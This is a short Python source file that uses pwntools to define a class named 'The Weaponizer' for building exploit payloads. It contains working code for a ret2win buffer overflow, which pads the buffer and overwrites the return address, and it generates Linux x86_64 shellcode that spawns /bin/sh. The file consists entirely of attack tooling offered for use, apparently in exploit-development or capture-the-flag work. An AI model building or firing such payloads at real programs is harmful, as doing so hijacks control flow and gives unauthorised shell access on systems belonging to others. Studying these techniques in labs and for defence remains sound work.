from pwn import *
import os

class PayloadFactory:
    """
    The Weaponizer.
    Constructs binary payloads (ROP chains, Shellcode, Overflows).
    """
    def __init__(self, arch="amd64", os="linux"):
        # Configure pwntools context
        context.arch = arch
        context.os = os
        context.bits = 64
        context.log_level = 'error' # Stay quiet

    def generate_buffer_overflow(self, offset: int, target_address: int) -> bytes:
        """
        Type: Ret2Win (Return to Function)
        Creates a payload that:
        1. Fills the buffer with 'A's (Padding)
        2. Overwrites the Return Pointer (RIP) with the address of the Function we want to run.
        """
        print(f"[FACTORY] Assembling payload...")
        print(f"    - Padding: {offset} bytes")
        print(f"    - Target RIP: {hex(target_address)}")
        
        # 1. The Padding (Junk data to reach the return address)
        payload = b"A" * offset
        
        # 2. The Return Address (Where we want to jump)
        # p64() packs the integer into 64-bit Little Endian bytes
        payload += p64(target_address)
        
        return payload

    def generate_shellcode(self) -> bytes:
        """
        Generates raw machine code to spawn a shell (/bin/sh).
        """
        print("[FACTORY] Compiling shellcode for Linux/x86_64...")
        # Pwntools contains a database of assembly for shells
        return asm(shellcraft.sh())